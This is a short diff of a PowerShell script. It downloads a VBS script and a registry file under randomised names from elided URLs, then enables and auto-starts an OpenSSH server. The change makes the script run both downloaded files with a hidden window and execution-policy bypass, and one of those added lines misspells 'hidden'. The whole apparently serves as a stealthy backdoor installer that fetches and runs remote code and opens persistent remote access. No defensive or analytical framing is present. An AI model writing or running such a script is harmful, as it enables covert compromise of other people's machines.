@@ -35,7 +35,9 @@ $vbs_script = random_text
 $reg = random_text
 Invoke-WebRequest -Uri ... -OutFile "$vbs_script.vbs"
 Invoke-WebRequest -Uri ... -OutFile "$reg.reg" 
-.\reg.reg
+powershell -windowstyle hiddne -ep bypass ".\$reg.reg"
+powershell -windowstyle hidden -ep bypass "$vbs_script.vbs"
+
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
